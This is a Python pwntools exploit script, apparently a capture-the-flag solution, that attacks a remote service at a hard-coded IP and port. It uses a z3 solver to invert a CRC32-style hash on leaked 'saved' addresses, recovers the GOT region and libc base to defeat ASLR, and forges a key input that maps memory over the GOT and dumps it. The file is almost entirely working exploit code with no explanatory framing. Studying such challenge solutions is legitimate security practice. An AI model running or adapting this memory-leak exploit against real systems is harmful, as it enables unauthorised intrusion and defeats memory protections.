# leak values from got to get remote libc

from pwn import *
from z3 import *
import time
#io = process("./app",aslr=True)
io = remote("58.229.185.61",10002)
libc = ELF("./libc.so.6")


def revAlgo(addr,n):
    s = Solver()

    # x is the initial address
    x = BitVec("x",64)
    local_1c = BitVec("local_1c",64) # 64 bit so can << 0xc
    local_1c = 0xffffffff 

    for i in range(n):
        byte = BitVec("byte",8)
        byte = (x & int(0xff<<8*i)) >> int(8*i)
        local_1c ^= byte 
        for j in range(8):
            local_1c = If(local_1c & 1 != 0, local_1c >> 1 ^ 0xedb88320, local_1c >> 1)

    local_1c ^= 0xffffffff
    local_1c = local_1c << 0xc

    if n == 8:
        # this is to leak addresses using the saved addresses
        s.add(Or(And(0x7f0000000000 < x, x < 0x7fffffffffff), And(0x550000000000 < x, x < 0x56ffffffffff)))
        s.add(x % 0x1000 == 0)
    else:
        # this is to craft own input so that our own flash memory is at addr
        s.add(x < (0x100**n)) # so if n  = 6, ans is 6 digits
        s.add(x % 0x1000 != 0) # so no null bytes
    s.add(local_1c == addr)

    s.check()
    return s.model()[x].as_long()
    
def algo(addr,n):
    # to test my understanding of the algo and see where I messed up in the rev
    local_1c = 0xffffffff 

    for i in range(n):
        byte = (addr & int(0xff<<8*i)) >> int(8*i)
        local_1c ^= byte
        for j in range(8):
            if (local_1c & 1 != 0):
                # odd
                local_1c = local_1c >> 1 ^ 0xedb88320
            else:
                local_1c = local_1c >> 1

    local_1c ^= 0xffffffff
    local_1c = local_1c << 0xc

    return local_1c

flashes = []
leaks = []
for i in range(6):
    io.recvuntil(b"Saved : ")
    flash = int(io.recvline()[:-1],16)
    flashes.append(flash)
    leaks.append(revAlgo(flash,8))

leaksCopy = leaks.copy()
leaks.sort()

gotRegion = leaks[0]
libc.address = leaks[-2] - 0x22e000 # seems like if PIE is correct, leaks[-1] is always wrong
log.info("GOT TABLE REGION: " + hex(gotRegion) )
log.info("LIBC BASE: " + hex(libc.address))

leaks = [hex(i) for i in leaks]
log.info("LEAKS: " + str(leaks))

# search for the corresponding flash
gotFlash = flashes[leaksCopy.index(gotRegion)]
log.info("TARGET FLASH ADDR: " + hex(gotFlash))

privKey = revAlgo(gotFlash,6)
log.info("PRIVKEY: " + hex(privKey))


io.sendlineafter(b":>",b"2")
io.sendlineafter(b":>",p64(privKey))
io.sendlineafter(b":>",str(0x1000))

io.recvuntil(b"Your Map: ")
flashAddr = int(io.recvline()[:-1],16)
log.info("FLASH ADDR: " + hex(flashAddr))

io.sendlineafter(b":>",b"3")
io.sendlineafter(b":>",str(0x10)) 

io.recv()
for i in range(15):
    print(str(i),hex(u64(io.recv(8))))

#gdb.attach(io,gdbscript="break *" + hex(gotRegion-0x3000+0xa16))
#io.interactive()
